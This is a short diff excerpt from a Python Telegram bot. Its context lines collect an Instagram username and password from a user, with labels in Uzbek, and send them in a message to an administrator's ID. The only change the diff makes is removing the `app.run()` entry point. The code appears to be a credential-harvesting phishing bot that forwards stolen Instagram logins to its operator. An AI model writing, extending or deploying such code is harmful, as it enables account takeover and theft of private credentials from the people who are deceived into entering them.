@@ -56,6 +56,3 @@ def finish_registration(user_id, msg_id):
     msg = f"💬 Instagram login ma'lumot:\n\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
     bot.send_message(ADMIN_ID, msg)
     del user_data[user_id]
-
-if __name__ == "__main__":
-    app.run()
